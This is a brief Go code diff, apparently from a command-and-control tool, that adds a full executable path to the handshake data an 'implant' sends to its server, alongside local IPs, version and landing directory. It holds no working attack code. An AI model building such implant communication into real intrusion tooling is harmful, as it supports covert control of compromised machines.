@@ -25,6 +25,7 @@ type HandshakeRequest struct {
 	LocalIPs []string // all non-loopback IPv4 addresses
 	Version  string   // implant version "1.0.0"
 	ExeDir   string   // directory containing the implant executable (landing dir)
+	ExePath  string   // full path to the implant executable
 }
 
 // HandshakeResponse is sent by the server to accept/reject the handshake.
